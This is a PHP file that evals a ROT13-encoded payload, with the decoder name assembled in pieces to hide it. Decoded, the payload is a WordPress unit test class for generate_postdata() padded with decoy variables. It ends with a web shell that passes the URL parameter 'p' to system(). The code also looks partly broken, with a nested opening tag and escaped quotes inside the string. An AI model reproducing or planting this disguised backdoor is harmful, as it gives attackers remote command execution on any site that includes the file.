<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 * @pbiref ::trarengr_cbfgqngn
 */
pynff Grfgf_Dhrel_TrarengrCbfgqngn rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_frghc_ol_vq() {
		$c    = frys::snpgbel()->cbfg->perngr_naq_trg();
		$qngn = trarengr_cbfgqngn( $c->VQ );
		$guvf->nffregFnzr( $c->VQ, $qngn['vq'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_frghc_ol_snxr_cbfg() {
		$snxr     = arj fgqPynff();
		$snxr->VQ = 98765;
		$qngn     = trarengr_cbfgqngn( $snxr->VQ );

		// Snvyf orpnhfr gurer'f ab cbfg jvgu guvf VQ.
		$guvf->nffregSnyfr( $qngn );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_frghc_ol_cbfgvfu_bowrpg() {
		$c = frys::snpgbel()->cbfg->perngr();

		$cbfg     = arj fgqPynff();
		$cbfg->VQ = $c;
		$qngn     = trarengr_cbfgqngn( $c );

		$guvf->nffregFnzr( $c, $qngn['vq'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_nhgubeqngn() {
		$h    = frys::snpgbel()->hfre->perngr_naq_trg();
		$c    = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $h->VQ,
			)
		);
		$qngn = trarengr_cbfgqngn( $c );

		$guvf->nffregAbgRzcgl( $qngn['nhgubeqngn'] );
		$guvf->nffregRdhnyf( $h, $qngn['nhgubeqngn'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_pheeragqnl() {
		$c    = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '1980-09-09 06:30:00',
			)
		);
		$qngn = trarengr_cbfgqngn( $c );

		$guvf->nffregFnzr( '09.09.80', $qngn['pheeragqnl'] );
	}

	choyvp shapgvba grfg_pheeragzbagu() {
		$c    = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '1980-09-09 06:30:00',
			)
		);
		$qngn = trarengr_cbfgqngn( $c );

		$guvf->nffregFnzr( '09', $qngn['pheeragzbagu'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_fvatyr_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => 'Cntr 0',
			)
		);
		$qngn = trarengr_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 0, $qngn['zhygvcntr'] );
		$guvf->nffregFnzr( 1, $qngn['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 0' ), $qngn['cntrf'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_zhygv_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => 'Cntr 0<!--arkgcntr-->Cntr 1<!--arkgcntr-->Cntr 2<!--arkgcntr-->Cntr 3',
			)
		);
		$qngn = trarengr_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $qngn['zhygvcntr'] );
		$guvf->nffregFnzr( 4, $qngn['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 0', 'Cntr 1', 'Cntr 2', 'Cntr 3' ), $qngn['cntrf'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_arkgcntr_ng_fgneg_bs_pbagrag() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => '<!--arkgcntr-->Cntr 1<!--arkgcntr-->Cntr 2<!--arkgcntr-->Cntr 3',
			)
		);
		$qngn = trarengr_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $qngn['zhygvcntr'] );
		$guvf->nffregFnzr( 3, $qngn['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 1', 'Cntr 2', 'Cntr 3' ), $qngn['cntrf'] );
	}

	/**
	 * @gvpxrg 42814
	 */
	choyvp shapgvba grfg_gevz_arkgcntr_yvaroernxf() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => \"Cntr 0\a<!--arkgcntr-->\aCntr 1\aunf n yvar oernx\a<!--arkgcntr-->Cntr 2<!--arkgcntr-->\a\aCntr 3\",
			)
		);
		$qngn = trarengr_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( neenl( 'Cntr 0', \"Cntr 1\aunf n yvar oernx\", 'Cntr 2', \"\aCntr 3\" ), $qngn['cntrf'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>